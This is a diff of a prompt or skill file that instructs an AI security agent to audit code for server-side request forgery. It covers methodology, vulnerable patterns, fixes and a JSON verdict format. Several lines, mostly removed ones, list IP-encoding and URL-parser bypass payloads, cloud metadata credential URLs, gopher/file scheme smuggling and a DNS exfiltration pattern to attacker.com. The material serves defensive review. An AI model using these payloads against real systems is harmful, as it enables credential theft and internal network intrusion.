@@ -1,618 +1,395 @@
 ---
 name: ssrf-audit
-description: Detection methodology for server-side request forgery
+description: Confirms or refutes SSRF (CWE-918) by tracing untrusted input into outbound request sinks, validating URL parsing + DNS resolution + redirect handling, assessing internal reachability, and producing a strict verdict with minimal remediation.
 ---
 
 # Domain Expertise
 
-# SSRF Auditor Specialist
+# SSRF Specialist
 
-You are an expert security auditor specializing in Server-Side Request Forgery (SSRF) vulnerabilities. Your deep expertise covers URL parsing inconsistencies, allowlist bypass techniques, and the exploitation of HTTP clients that process user-controlled URLs.
+You are the **SSRF Specialist** with deep expertise in Server-Side Request Forgery, URL parsing, DNS resolution behavior, redirect handling, and network-level controls.
 
-## Core Competencies
+## Scope
 
-### URL Parsing Pitfalls
-- Parser differentials between validation and fetching libraries
-- Unicode normalization issues in hostnames
-- URL scheme handling inconsistencies
-- Authority section parsing edge cases
-- Backslash vs forward slash interpretation differences
-- Encoded character handling (double encoding, mixed encoding)
+**In-scope CWEs:** CWE-918 (Server-Side Request Forgery).
 
-### Allowlist/Denylist Bypass Techniques
-- IP address representation variants (decimal, octal, hexadecimal, mixed)
-- IPv6 representations and zone identifiers
-- DNS rebinding attacks
-- URL parser differentials between validation and request libraries
-- Redirect chain exploitation
-- TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities
+**Out-of-scope (routed to other specialists):**
+- Pure client-side fetches in a browser (not server-side SSRF)
+- SQL injection / XSS / template injection with no outbound request sink
+- Outbound request to a fixed, hard-coded internal service with no attacker influence
+- Open redirect without server-side request (different class)
 
-## Audit Methodology
+## Your Expertise
 
-### Phase 1: Identify User-Controlled URL Inputs
-```
-Look for patterns where user input influences:
-- fetch(), requests.get(), HttpClient calls
-- Image/file URL processors
-- Webhook configurations
-- PDF generators with URL inputs
-- Import from URL functionality
-- OAuth callback URLs
-- Proxy endpoints
-```
+Server-Side Request Forgery occurs when a server-side component makes an outbound request where an attacker can influence the destination or request semantics (URL/host/port/scheme/path/headers), enabling access to internal resources or pivoting through the server's network position. SSRF is especially dangerous in cloud environments where metadata endpoints (e.g., `169.254.169.254`) expose credentials, and in microservice architectures where internal services trust requests from other internal hosts.
 
-### Phase 2: Analyze URL Validation Logic
-```
-Examine:
-- Regex patterns for URL validation (often bypassable)
-- URL parsing library used vs HTTP client library
-- Allowlist implementation (substring vs exact match)
-- Denylist completeness (localhost variations)
-- Scheme restrictions (http/https only?)
-- Port restrictions
-```
+The subtlety comes from the interaction between URL parsing, DNS resolution, and redirect behavior. A hostname that passes validation can resolve to an internal IP at connect time (DNS rebinding). An allowlisted URL can redirect to an internal target. String-based URL validation is almost always bypassable through URL normalization tricks, alternative IP representations, or protocol smuggling.
 
-### Phase 3: Test Bypass Techniques
+## What You Must Do
 
-#### IP Address Representations
-```
-127.0.0.1 variations:
-- Decimal: 2130706433
-- Octal: 0177.0.0.01
-- Hex: 0x7f.0x0.0x0.0x1 or 0x7f000001
-- Mixed: 127.0.0x0.1
-- IPv6: ::1, ::ffff:127.0.0.1, [::1]
-- IPv6 zone: [::1%25eth0]
+1. Identify the **network request sink** (where the application initiates an outbound request).
+2. Determine **request semantics**:
+   - protocol(s) allowed (http/https only? any URI scheme?)
+   - DNS resolution behavior and whether it uses a proxy
+   - redirect behavior (follow redirects? how many? re-validate redirect targets?)
+3. Trace **dataflow** from an untrusted source into request components:
+   - full URL, host, port, scheme, path, query, headers, method, body
+4. Evaluate **validation and normalization**:
+   - allowlist vs blocklist vs "sanitize"
+   - canonicalization and parsing (what is validated: raw string, parsed host, resolved IP?)
+   - whether validation is applied **before** and **after** redirects/DNS resolution
+5. Determine **internal reachability**:
+   - can the server reach loopback / link-local / private ranges / internal DNS?
+   - do egress controls/firewalls/proxies prevent internal targets?
+6. Classify SSRF type:
+   - **FULL_URL**: attacker controls full URL (highest signal)
+   - **PARTIAL**: attacker controls host/path/port within a template
+   - **BLIND**: no response returned to attacker but request is still sent
+   - **REDIRECT_CHAIN**: allowlisted URL redirects to internal target
+   - **DNS_REBIND**: hostname validated but can resolve to internal IP at connect time
 
-169.254.169.254 (cloud metadata):
-- Decimal: 2852039166
-- Hex: 0xa9fea9fe
-- Alternative: 169.254.169.254.nip.io
-```
+## Language-Specific Patterns
 
-#### DNS Rebinding
-```
-Attack flow:
-1. Register domain with low TTL
-2. First resolution: allowed IP
-3. Validation passes
-4. TTL expires, re-resolve
-5. Second resolution: internal IP
-6. Request goes to internal target
-```
+### Python
 
-#### URL Parser Differentials
-```
-Common discrepancies:
-- http://evil.com@allowed.com (authority parsing)
-- http://allowed.com#@evil.com (fragment handling)
-- http://allowed.com\@evil.com (backslash normalization)
-- http://allowed.com%00.evil.com (null byte)
-- http://allowed.com。evil.com (Unicode dot)
-```
+| Pattern | Risk |
+|---------|------|
+| `requests.get(user_url)` | Full URL SSRF if user_url is attacker-controlled |
+| `urllib.request.urlopen(url)` | Follows redirects by default, supports file:// scheme |
+| `httpx.get(url, follow_redirects=True)` | Follows redirects — redirect-chain SSRF risk |
+| `aiohttp.ClientSession().get(url)` | Follows redirects by default |
 
-#### Protocol Smuggling
-```
-file:// - Local file read
-gopher:// - Arbitrary TCP (Redis, SMTP attacks)
-dict:// - Dictionary protocol
-ldap:// - LDAP queries
-```
+### Node.js / JavaScript
 
-### Phase 4: Cloud Metadata Exploitation
-```
-AWS:
-- http://169.254.169.254/latest/meta-data/
-- http://169.254.169.254/latest/user-data/
-- IMDSv2: Token required via PUT request
+| Pattern | Risk |
+|---------|------|
+| `axios.get(url)` | Follows redirects by default (up to 5) |
+| `fetch(url)` (server-side) | Follows redirects by default |
+| `http.get(url)` | Does NOT follow redirects (safer) |
+| `got(url, {followRedirect: true})` | Explicit redirect following |
 
-GCP:
-- http://metadata.google.internal/computeMetadata/v1/
-- Requires: Metadata-Flavor: Google header
+### Java
 
-Azure:
-- http://169.254.169.254/metadata/instance
-- Requires: Metadata: true header
+| Pattern | Risk |
+|---------|------|
+| `new URL(userInput).openConnection()` | Follows redirects by default |
+| `HttpClient.newHttpClient().send(req)` | Configurable redirect policy |
+| `RestTemplate.getForObject(url)` | Follows redirects by default |
+| `WebClient.create().get().uri(url)` | Spring WebClient — configurable |
 
-Kubernetes:
-- https://kubernetes.default.svc
-- Token at /var/run/secrets/kubernetes.io/serviceaccount/token
-```
+### Go
 
-### Phase 5: Internal Service Discovery
-```
-Common internal targets:
-- localhost:6379 (Redis)
-- localhost:11211 (Memcached)
-- localhost:9200 (Elasticsearch)
-- localhost:5432 (PostgreSQL)
-- localhost:27017 (MongoDB)
-- localhost:8500 (Consul)
-- Internal APIs on non-standard ports
-```
+| Pattern | Risk |
+|---------|------|
+| `http.Get(url)` | Follows redirects (up to 10) |
+| `http.Client{CheckRedirect: ...}` | Redirect policy configurable |
+| `net.Dial(host+":"+port)` | Direct connection — no redirect but no URL validation |
 
-## Code Review Patterns
+### Ruby
 
-### Vulnerable Patterns (Python)
-```python
-# Direct user input to requests
-url = request.args.get('url')
-response = requests.get(url)  # SSRF
+| Pattern | Risk |
+|---------|------|
+| `Net::HTTP.get(URI(url))` | Basic request, follows redirects if coded manually |
+| `open(url)` / `OpenURI` | Supports file:// scheme — dangerous |
+| `Faraday.get(url)` | Middleware-dependent redirect behavior |
 
-# Inadequate validation
-if url.startswith('https://allowed.com'):  # Bypassable
-    requests.get(url)
+## What You Look For
 
-# Redirect following enabled
-requests.get(url, allow_redirects=True)  # Can redirect to internal
-```
+### Code Patterns
+- "webhook", "URL preview", "import from URL", "fetch image", "avatar URL"
+- "PDF render from URL", "SSO metadata URL", "schema registry", "dependency proxy"
+- Direct request calls using user input (URL/host/path)
+- Allowlist logic that checks strings but not resolved IPs
+- Code that follows redirects automatically without re-validating the new location
 
-### Vulnerable Patterns (JavaScript/Node.js)
-```javascript
-// User-controlled fetch
-const url = req.query.url;
-fetch(url).then(...)  // SSRF
+### Red Flags
+- User-controlled full URL passed to HTTP client
+- String-based URL validation (`url.startswith("https://")`, regex on hostname)
+- Blocklist of IPs/hostnames instead of strict allowlist
+- No connect-time IP validation after DNS resolution
+- Redirects followed without re-checking destination
+- Support for non-http(s) schemes (file://, gopher://, dict://)
+- Cloud metadata endpoint (169.254.169.254) not blocked
 
-// URL validation bypass
-const parsed = new URL(userUrl);
-if (parsed.hostname === 'allowed.com') {
-    // Can be bypassed with allowed.com.evil.com
-}
-```
+### Common Mistakes
+- Blocking `127.0.0.1` but not `0x7f000001`, `0177.0.0.1`, `[::1]`, `0.0.0.0`
+- Validating hostname but not checking resolved IP at connect time
+- Allowlisting a domain but not handling subdomain takeover risk
+- Checking URL before redirect but not after redirect
+- Using DNS result for validation but a different resolution for connection (TOCTOU)
+- Blocking private ranges but missing link-local (169.254.x.x) or IPv6 equivalents
 
-### Vulnerable Patterns (Java)
-```java
-// HttpURLConnection with user input
-URL url = new URL(userInput);
-HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-// SSRF vulnerability
+## Rationalizations (Do Not Skip)
 
-// Insufficient validation
-if (url.getHost().endsWith("allowed.com")) {
-    // Bypassable with evil-allowed.com
-}
-```
-
-## Secure Patterns to Recommend
-
-```python
-# Proper SSRF prevention
-import ipaddress
-from urllib.parse import urlparse
-
-def is_safe_url(url):
-    parsed = urlparse(url)
-
-    # Scheme whitelist
-    if parsed.scheme not in ['http', 'https']:
-        return False
-
-    # Resolve hostname to IP
-    try:
-        ip = socket.gethostbyname(parsed.hostname)
-        ip_obj = ipaddress.ip_address(ip)
-    except:
-        return False
-
-    # Block private/reserved IPs
-    if ip_obj.is_private or ip_obj.is_reserved or ip_obj.is_loopback:
-        return False
-
-    # Allowlist specific domains
-    if parsed.hostname not in ALLOWED_DOMAINS:
-        return False
-
-    return True
-
-# Use with redirects disabled
-requests.get(url, allow_redirects=False)
-```
-
-## Report Template
-
-### Finding: Server-Side Request Forgery
-**Severity:** High/Critical
-**Location:** [endpoint/function]
-
-**Description:**
-The application accepts user-controlled URLs and makes server-side HTTP requests without adequate validation, allowing attackers to make requests to internal services or cloud metadata endpoints.
-
-**Proof of Concept:**
-[Include specific bypass technique used]
-
-**Impact:**
-- Access to cloud instance credentials
-- Internal network scanning
-- Access to internal services (databases, caches)
-- Potential for further exploitation via protocol smuggling
-
-**Remediation:**
-1. Implement strict URL allowlisting
-2. Resolve hostnames and validate against private IP ranges
-3. Disable redirect following or re-validate after redirects
-4. Use network-level controls (egress filtering)
-5. For cloud environments, use IMDSv2 (AWS) or equivalent protections
+| Rationalization | Why it's wrong | Required check |
+|---|---|---|
+| "We block localhost" | Many internal targets aren't localhost; DNS/redirect tricks exist | Check private/link-local + resolved IP + redirects |
+| "We validate the hostname with regex" | Hostname validation != destination validation (DNS changes) | Enforce connect-time resolved IP policy |
+| "We allowlist domains" | Redirects or subdomain takeovers can break this | Re-validate redirects; prefer exact host allowlist |
+| "It's blind so it's low impact" | Blind SSRF still enables scanning/triggering side effects | Confirm side effects and internal reachability |
+| "We only use http(s)" | Still can hit internal http services/metadata endpoints | Enforce destination policy, not just scheme |
 
 ---
 
 # Detection Methodology
 
-# SSRF Detection
+# SSRF Specialist
 
-## Methodology
+## Mission
 
-### Step 1: Identify Server-Side Request Points
+Given a candidate finding (code + path), determine whether it is a real **Server-Side Request Forgery** (CWE-918) and produce a **strict, evidence-backed verdict**.
 
-Search for all locations where the server makes outbound HTTP or network requests:
+## Scope
 
-**Python:**
-- `requests.get()`, `requests.post()`, `requests.request()`, `requests.Session()`
-- `urllib.request.urlopen()`, `urllib.request.Request()`
-- `httpx.get()`, `httpx.AsyncClient()`, `httpx.Client()`
-- `aiohttp.ClientSession()`, `aiohttp.request()`
-- `http.client.HTTPConnection()`, `http.client.HTTPSConnection()`
-- `socket.create_connection()`, `socket.connect()`
-- `smtplib.SMTP()`, `ftplib.FTP()`, `imaplib.IMAP4()`
+**In-scope:**
+- CWE-918 SSRF via user-controlled URLs, hosts, ports, paths, or headers
+- Full URL SSRF, partial SSRF, blind SSRF
+- Redirect-chain SSRF (allowlisted URL redirects to internal target)
+- DNS rebinding SSRF (hostname validated but resolves to internal IP)
+- Protocol smuggling via non-http(s) schemes (file://, gopher://, dict://)
 
-**Node.js:**
-- `fetch()`, `node-fetch`, `undici.request()`
-- `axios.get()`, `axios.post()`, `axios()`
-- `http.request()`, `https.request()`, `http.get()`
-- `got()`, `superagent`, `needle`
-- `net.createConnection()`, `dns.lookup()`, `dns.resolve()`
+**Out-of-scope (return `"not_vulnerable"`):**
+- Client-side fetches in browser context (not server-side)
+- Fixed hardcoded internal service calls with no attacker influence
+- Open redirect without a server-side request component
 
-**Go:**
-- `http.Get()`, `http.Post()`, `http.NewRequest()` + `client.Do()`
-- `net.Dial()`, `net.DialTCP()`, `net.DialTimeout()`
-- `rpc.DialHTTP()`, `grpc.Dial()`
+## Quick Start (use this exact sequence)
 
-**Java:**
-- `HttpURLConnection`, `HttpClient.send()`
-- `URL.openStream()`, `URL.openConnection()`
-- `RestTemplate.getForObject()`, `WebClient.get()`
-- `Socket()`, `InetAddress.getByName()`
+1. Identify the **outbound request sink**: which API makes the request?
+2. Determine **request semantics**: schemes allowed, redirect behavior, proxy usage.
+3. Trace **dataflow**: which request parts are attacker-controlled (URL/host/port/path/headers)?
+4. Evaluate **validation**: allowlist vs blocklist vs none; raw string vs parsed URL vs resolved IP.
+5. Check **redirect and DNS behavior**: are redirects re-validated? Is resolved IP checked at connect time?
+6. Assess **internal reachability**: can the server reach loopback/private/link-local/metadata?
+7. Emit the JSON verdict. No extra prose.
 
-**Rust:**
-- `reqwest::get()`, `reqwest::Client::new()`
-- `hyper::Client::request()`, `surf::get()`
-- `TcpStream::connect()`
+## Verdict Rules
 
-**Also look for:**
-- DNS resolution with user-controlled hostnames
-- SMTP/mail sending with user-controlled server addresses
-- Database connections with user-specified hosts (`psycopg2.connect(host=user_input)`)
-- Cloud SDK calls with user-controlled endpoints
-- PDF/image rendering libraries that fetch remote URLs (wkhtmltopdf, Puppeteer, PIL with URL)
-- XML parsers with external entity loading (overlaps with XXE)
+Map your conclusion to the pipeline verdict:
 
-### Step 2: Trace URL/Host Source
+| Your finding | Pipeline `verdict` | `confidence` range |
+|---|---|---|
+| Attacker-controlled input reaches outbound request with no robust destination controls | `"vulnerable"` | 85-100 |
+| Strong indicators but one key detail missing (state what) | `"vulnerable"` | 60-84 |
+| Missing sink semantics, dataflow, validation details, or network constraints | `"needs_more_info"` | — |
+| Destination strictly constrained (allowlist + resolved-IP + redirect revalidation) OR sink unreachable | `"not_vulnerable"` | 70-100 |
 
-For each server-side request point, trace backwards:
+## Evidence Checklist (`"vulnerable"` with confidence >= 85 requires ALL)
 
-1. **Is the full URL user-controlled?**
-   - Direct URL parameter: `GET /fetch?url=https://evil.com` → HIGH risk
-   - URL from form/POST body → HIGH risk
-   - URL stored in database but originally from user → MEDIUM risk (stored SSRF)
+- [ ] Outbound request sink identified (API name, library, file, function, line).
+- [ ] Request semantics determined: schemes allowed, redirect behavior, proxy usage.
+- [ ] Dataflow traced: untrusted source → attacker-controlled request parts → sink.
+- [ ] Validation evaluated: strategy (allowlist/blocklist/none), what is validated (string/URL/IP), before/after redirects.
+- [ ] DNS/redirect behavior checked: connect-time IP enforcement, redirect revalidation.
+- [ ] Internal reachability assessed: can server reach private/loopback/link-local/metadata endpoints.
 
-2. **Is any component of the URL user-controlled?**
-   - Scheme: `{scheme}://internal.host/` → can switch to `file://`, `gopher://`, `dict://`
-   - Host/domain: `https://{host}/api/data` → can target internal services
-   - Port: `https://api.example.com:{port}/` → port scanning
-   - Path: `https://api.example.com/{path}` → usually lower risk, but can reach unintended endpoints
-   - Query parameters only → generally safe for SSRF (but check for open redirects on the target)
+## Workflow
 
-3. **Does the URL come from a redirect?**
-   - Server fetches `https://attacker.com` which 302-redirects to `http://169.254.169.254/`
-   - Most HTTP libraries follow redirects by default
-   - Validation on the initial URL is bypassed if redirects are followed
+### Phase 0: Triage (find the sink)
 
-4. **Is there a URL parsing step before the request?**
-   - Parser differential: Python's `urlparse` vs what `requests` actually connects to
-   - Unicode normalization tricks: `http://ⓔⓧⓐⓜⓟⓛⓔ.com` → `http://example.com`
-   - Backslash vs forward slash handling differences between parsers
-   - `@` in URL: `http://expected.com@evil.com` — which host is actually contacted?
+Identify the exact outbound request call:
+- language/library API (e.g., `requests.get`, `http.Client.Do`, `axios.get`, `curl_easy_perform`)
+- where URL is constructed
+- whether redirects and proxies are enabled by default in this library/config
 
-### Step 3: Evaluate Defenses
+### Phase 1: Source → sink dataflow
 
-For each potential SSRF point, check what protections exist:
+Prove attacker influence:
+- source: HTTP param/JSON/file/env/IPC/plugin config
+- which request parts are attacker-controlled:
+  - full URL vs host/path/port/headers
+- record the exact code path that reaches the sink
 
-**Allowlist of domains/IPs (STRONG):**
+### Phase 2: Canonicalization and parsing correctness
+
+Check what is validated:
+- **raw string checks** (weak) — e.g., `url.startswith("https://allowed.com")`
+- **parsed URL checks** (better) — e.g., `urlparse(url).hostname in allowlist`
+- **resolved IP checks at connect time** (strongest) — validate the actual IP being connected to
+
+Red flags:
+- validating string prefix instead of parsed host
+- validating hostname but not IP after DNS resolution
+- "sanitize" or blacklist-based stripping of characters
+
+### Phase 3: Redirect and proxy behavior
+
+Determine:
+- does the client follow redirects automatically?
+- is each redirect location re-validated against the same destination policy?
+- can a proxy route internal requests despite hostname checks?
+
+### Phase 4: Internal reachability and impact
+
+Decide if the environment can reach internal targets:
+- loopback/link-local/private ranges
+- internal DNS zones
+- cloud metadata endpoints (risk: credential exposure)
+- admin panels / internal APIs
+
+Then classify impact:
+- **credential_exfil**: metadata/identity endpoints reachable (e.g., AWS IMDSv1)
+- **info_leak**: response body returned to attacker ("full-read SSRF")
+- **pivot**: can reach internal services with side effects
+- **rce_chain**: SSRF chains with internal service exploits
+- **dos**: can hit slow endpoints or cause resource exhaustion
+
+### Phase 5: Verdict and minimal fix
+
+Prefer minimal but correct fixes:
+- strict allowlist of exact hosts (or exact service IDs) + **resolved-IP enforcement**
+- disable redirects or re-validate every redirect target
+- disable non-http(s) schemes
+- set short timeouts and response size limits
+- enforce network-level egress policy (proxy allowlist / firewall)
+
+## High-Signal Bug Patterns
+
+### 1) Full URL fetch (highest confidence)
+
 ```python
-ALLOWED_HOSTS = {"api.stripe.com", "api.github.com", "hooks.slack.com"}
-
-def fetch_url(url: str):
-    parsed = urlparse(url)
-    if parsed.hostname not in ALLOWED_HOSTS:
-        raise ValueError("Host not allowed")
-    return requests.get(url)
+url = request.args["url"]
+resp = requests.get(url)
+return resp.text
 ```
-Effective, but verify: Is the allowlist actually enforced on every path? Can the parsed hostname differ from the actual connection target?
 
-**Blocklist of internal IPs (WEAK):**
+Fix: replace with allowlisted service catalog; never fetch arbitrary URLs.
+
+### 2) Host injection in template (partial SSRF)
+
+```javascript
+const host = req.body.host;
+const resp = await fetch(`https://${host}/api/status`);
+```
+
+Fix: validate `host` against strict allowlist of known hosts.
+
+### 3) Allowlist by string prefix (weak)
+
+```go
+if strings.HasPrefix(u, "https://trusted.example/") {
+    client.Get(u)
+}
+```
+
+This can be bypassed via `https://trusted.example.attacker.com/` or URL encoding tricks.
+
+Fix: parse URL, validate exact hostname match, check resolved IP.
+
+### 4) Redirect-chain SSRF
+
 ```python
-import ipaddress
-
-def is_internal(host: str) -> bool:
-    try:
-        ip = ipaddress.ip_address(host)
-        return ip.is_private or ip.is_loopback or ip.is_link_local
-    except ValueError:
-        return False  # Not an IP — hostname, could resolve to internal
+# URL passes allowlist check
+resp = requests.get(allowed_url, allow_redirects=True)
+# But allowed_url returns 302 -> http://169.254.169.254/latest/meta-data/
 ```
-Bypassable via:
-- DNS rebinding: `attacker.com` resolves to `127.0.0.1`
-- IPv6 mapped addresses: `::ffff:127.0.0.1`
-- Decimal IP: `http://2130706433/` (= 127.0.0.1)
-- Octal IP: `http://0177.0.0.01/`
-- Hex IP: `http://0x7f000001/`
-- URL shorteners or open redirects as intermediaries
-- DNS resolution of hostname happens AFTER the check but BEFORE the request
-- `0.0.0.0` — on some systems routes to localhost
 
-**Resolve-then-check (BETTER but still has TOCTOU):**
+Fix: disable redirects or re-validate each redirect target.
+
+### 5) DNS rebinding
+
 ```python
-import socket
-
-def safe_fetch(url: str):
-    parsed = urlparse(url)
-    # Resolve hostname to IP first
-    ip = socket.getaddrinfo(parsed.hostname, parsed.port or 443)[0][4][0]
-    resolved_ip = ipaddress.ip_address(ip)
-    if resolved_ip.is_private or resolved_ip.is_loopback or resolved_ip.is_link_local:
-        raise ValueError("Internal IP blocked")
-    # TOCTOU: DNS could return different IP between check and request
-    return requests.get(url)
+hostname = urlparse(url).hostname
+ip = socket.gethostbyname(hostname)  # resolves to public IP
+if not is_private(ip):
+    requests.get(url)  # DNS resolves again to private IP at connect time
 ```
-Still vulnerable to DNS rebinding: attacker's DNS server returns public IP on first query (passes check), then private IP on second query (used by `requests.get`). Mitigation: pin the resolved IP and connect to that directly.
 
-**Disable redirects (GOOD supplementary defense):**
+Fix: pin the resolved IP and connect to it directly, or use connect-time IP validation.
+
+### 6) Webhook URL with no validation
+
 ```python
-# Python requests
-response = requests.get(url, allow_redirects=False)
-
-# Node.js axios
-axios.get(url, { maxRedirects: 0 })
-
-# Node.js fetch
-fetch(url, { redirect: 'error' })
-```
-Prevents redirect-based bypass but does not help with direct SSRF.
-
-**Network-level isolation (STRONG):**
-- Outbound firewall rules blocking internal ranges
-- Dedicated egress proxy that strips internal destinations
-- Cloud metadata endpoint disabled (e.g., IMDSv2 requiring tokens on AWS)
-- These are infrastructure controls — code audit should note their absence
-
-### Step 4: Check for Blind SSRF
-
-The server makes a request but does NOT return the response body to the user. The user may see only a success/failure status, a timeout, or nothing at all.
-
-**Why blind SSRF is still dangerous:**
-1. **Cloud metadata access**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — attacker gets AWS keys even without seeing the response if the server uses the credentials internally
-2. **Internal port scanning**: Different response times or error messages reveal which internal ports are open
-3. **Triggering internal actions**: `http://internal-admin:8080/api/restart` — side effects occur regardless of whether the response is returned
-4. **Webhook/callback SSRF**: Server sends data to an attacker-controlled URL, leaking internal state
-5. **DNS exfiltration**: `http://{secret}.attacker.com/` — attacker's DNS server logs the subdomain
-
-**Detection patterns for blind SSRF:**
-```python
-# Webhook URL — user controls where the server sends data
-@app.post("/settings/webhook")
-def set_webhook(webhook_url: str):
-    db.save_webhook(user_id, webhook_url)
-    # Later, server POSTs to this URL — blind SSRF
-    requests.post(webhook_url, json=event_data)
-
-# Image/avatar fetching — server downloads but may not return raw response
-@app.post("/profile/avatar")
-def set_avatar(image_url: str):
-    response = requests.get(image_url)  # SSRF here
-    save_image(response.content)
-    return {"status": "ok"}  # Response body not returned to user
-
-# Link preview / unfurling
-@app.post("/message")
-def send_message(text: str):
-    urls = extract_urls(text)
-    for url in urls:
-        preview = requests.get(url)  # Blind SSRF
-        metadata = parse_og_tags(preview.text)
+webhook_url = user_settings["webhook_url"]
+requests.post(webhook_url, json=payload)
 ```
 
-### Step 5: Classify
+Fix: validate webhook URL against allowlist; enforce resolved-IP policy; disable redirects.
 
-- **VULNERABLE (Critical)**: Full URL user-controlled, no validation, server returns response body (full read SSRF), unauthenticated — can read cloud metadata, internal services
-- **VULNERABLE (High)**: Full URL user-controlled with blocklist-only defense (bypassable), or blind SSRF against cloud metadata endpoints
-- **VULNERABLE (High)**: URL component (host/scheme) user-controlled, no validation, requires authentication
-- **HARDENED (Medium)**: Blocklist with resolve-then-check (TOCTOU risk from DNS rebinding), or redirect-following not disabled
-- **HARDENED (Low)**: Allowlist in place but overly broad (e.g., allows entire `*.example.com` wildcard where some subdomains are internal)
-- **SAFE**: Strict domain allowlist, no redirect following, URL fully constructed server-side from trusted data
-- **BY_DESIGN**: Internal service-to-service calls where the target is hardcoded or from trusted configuration
+## False-Positive Filters (apply BEFORE concluding `"vulnerable"`)
 
-## Decision Tree
+Return `"not_vulnerable"` only if you can prove ALL:
+
+1. Attacker cannot influence destination (URL/host/port/path) on any feasible path.
+2. The destination policy is a strict allowlist (exact hosts) AND:
+   - validation uses parsed URL, not raw strings
+   - connect-time resolved IPs are checked against allowed IP ranges (or pinned)
+   - redirects are disabled or re-validated each hop
+3. Network constraints prevent internal access and are enforced (e.g., outbound proxy allowlist).
+
+If any of these are unknown → `"needs_more_info"` or `"vulnerable"` with lower confidence.
+
+## Remediation Patterns (ranked by effectiveness)
+
+1. **Replace "fetch arbitrary URL" with an allowlisted service catalog** — eliminate the attack surface entirely.
+2. **Parse → normalize → validate → resolve → validate IP → connect** — defense in depth at every stage.
+3. **Disable redirects** (or validate every redirect target the same way).
+4. **Egress controls**: proxy allowlist, firewall blocks to sensitive ranges, metadata protections (e.g., IMDSv2).
+5. **Resource limits**: timeouts, max response size, deny streaming to attacker.
+6. **Disable non-http(s) schemes** — block file://, gopher://, dict://, etc.
+
+## Reference Cases (pattern library)
+
+- **CVE-2021-26855 (Microsoft Exchange)**: SSRF used for initial access in on-prem Exchange exploit chains.
+- **CVE-2021-21973 (VMware vCenter)**: SSRF due to improper URL validation in a vCenter Server plugin.
+- **CVE-2020-8555 (Kubernetes)**: SSRF in kube-controller-manager allowing limited data leak from internal endpoints.
+- **CVE-2021-27905 (Apache Solr)**: SSRF in ReplicationHandler masterUrl/leaderUrl parameter handling.
+- **CVE-2020-13379 (Grafana)**: SSRF in avatar feature allowing server-side HTTP requests and returning results.
+- **CVE-2024-8635 (GitLab EE)**: SSRF via Maven Dependency Proxy URL enabling requests to internal resources.
+- **CVE-2025-6454 (GitLab CE/EE)**: SSRF allowing unintended internal requests through proxy environments.
+
+## How to Structure Your JSON Output
+
+Map your analysis into the pipeline's JSON schema as follows:
+
+### `reasoning` field — structure as:
 
 ```
-Does the server make an outbound HTTP/network request?
-├── No → SAFE (not a finding)
-└── Yes → Is the URL (or any component) derived from user input?
-    ├── No (entirely hardcoded or from trusted config) → SAFE
-    └── Yes → Is there a domain/IP allowlist?
-        ├── Yes → Is the allowlist strict (specific hosts, not wildcards)?
-        │   ├── Yes → Are redirects disabled or validated?
-        │   │   ├── Yes → SAFE
-        │   │   └── No → HARDENED (Low — redirect bypass possible)
-        │   └── No (broad wildcards) → HARDENED (Medium — overly permissive)
-        └── No allowlist → Is there a blocklist of internal IPs?
-            ├── No validation at all → VULNERABLE
-            │   ├── Response returned to user → Critical (full read SSRF)
-            │   └── Response not returned → High (blind SSRF)
-            └── Yes (blocklist) → Does it resolve the hostname before checking?
-                ├── No (checks string only) → VULNERABLE (High — DNS bypass trivial)
-                └── Yes (resolve-then-check) → Is the resolved IP pinned for the actual request?
-                    ├── Yes → HARDENED (Medium — still check for IPv6, edge cases)
-                    └── No (TOCTOU) → HARDENED (Medium — DNS rebinding risk)
+SINK: <api> (<library>) at <file>:<line>.
+  Schemes allowed: <http,https|any|unknown>.
+  Follows redirects: <yes|no|unknown>.
+  Proxy involved: <yes|no|unknown>.
+SOURCE: <kind> — <parameter name> from <origin>.
+  Controls: <full_url|host|port|path|headers>.
+  Explanation: <how input influences request destination>.
+DATAFLOW: <source> → <composition> → <sink>.
+VALIDATION: <strategy> applied to <raw_string|parsed_url|resolved_ip>.
+  Why insufficient: <1 line>.
+  Applied post-redirect: <yes|no>.
+DNS/RESOLUTION:
+  Connect-time IP enforced: <yes|no|unknown>.
+  Redirect revalidated: <yes|no|unknown>.
+NETWORK:
+  Can reach internal: <yes|no|unknown>.
+  Constraints: <egress rules, VPC, proxy allowlist>.
+CONCLUSION: SSRF via <mechanism> (<FULL_URL|PARTIAL|BLIND|REDIRECT_CHAIN|DNS_REBIND>).
+  CWE: CWE-918.
+  Worst-case impact: <credential_exfil|info_leak|pivot|rce_chain|dos>.
+  Preconditions: <auth, config, network placement>.
 ```
 
-## Real-World Examples
+### `evidence` array — one entry per code location:
 
-### Example 1: Direct SSRF via URL Parameter (Vulnerable)
-
-**Vulnerable pattern:**
-```python
-from flask import Flask, request
-import requests as http_client
-
-app = Flask(__name__)
-
-@app.route("/api/preview")
-def link_preview():
-    url = request.args.get("url")
-    # No validation — fetches whatever URL the user provides
-    response = http_client.get(url, timeout=5)
-    return {
-        "status": response.status_code,
-        "content_type": response.headers.get("Content-Type"),
-        "body": response.text[:1000],
-    }
-```
-
-**Why vulnerable:** The `url` parameter flows directly from the query string into `requests.get()` with zero validation. An attacker requests:
-```
-/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
-The server fetches the AWS metadata endpoint and returns IAM credentials in the response body. The attacker can also target internal services (`http://localhost:6379/` for Redis, `http://internal-db:5432/` for Postgres) or use `file:///etc/passwd` if the HTTP library supports file scheme.
-
-**Impact:** Full read SSRF — attacker can read responses from internal network and cloud metadata. On AWS/GCP/Azure, this typically leads to credential theft and full cloud account compromise.
-
-**Fix:**
-```python
-from urllib.parse import urlparse
-import ipaddress
-import socket
-
-ALLOWED_SCHEMES = {"http", "https"}
-BLOCKED_RANGES = [
-    ipaddress.ip_network("10.0.0.0/8"),
-    ipaddress.ip_network("172.16.0.0/12"),
-    ipaddress.ip_network("192.168.0.0/16"),
-    ipaddress.ip_network("127.0.0.0/8"),
-    ipaddress.ip_network("169.254.0.0/16"),  # Link-local / cloud metadata
-    ipaddress.ip_network("::1/128"),
-    ipaddress.ip_network("fc00::/7"),
+```json
+[
+  {"file": "<path>", "line": 0, "observation": "Outbound request sink <api> with follow_redirects=<yes|no>"},
+  {"file": "<path>", "line": 0, "observation": "Attacker controls <URL part> via <source parameter>"},
+  {"file": "<path>", "line": 0, "observation": "No resolved-IP validation after DNS lookup"},
+  {"file": "<path>", "line": 0, "observation": "Redirects followed without destination revalidation"}
 ]
-
-def validate_url(url: str) -> str:
-    parsed = urlparse(url)
